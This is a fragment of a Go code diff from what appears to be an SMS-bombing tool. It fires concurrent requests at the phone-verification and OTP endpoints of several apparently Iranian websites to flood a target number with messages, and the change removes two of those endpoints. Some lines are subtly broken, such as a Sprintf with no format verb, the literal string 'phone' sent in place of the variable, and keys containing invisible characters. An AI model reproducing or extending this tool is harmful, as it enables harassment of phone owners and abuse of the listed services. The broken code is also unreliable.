@@ -344,9 +344,6 @@ func main() {
 		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
 			s57: phone,
 		}, ch) // verify site: i'm not robot
-		go sms(fmt.Sprintf("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", phone), map[string]interface{}{
-			"phoneNumber": phone,
-		}, ch) // edit :4/22/2025
 		go sms("https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // delete site: no Access
@@ -540,9 +537,6 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
 			"mobile­": "phone",
-		}, ch)  // edit :4/22/2025
-		go sms("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
-			"phoneNumber": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms("https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
 			"mobile­": "phone",
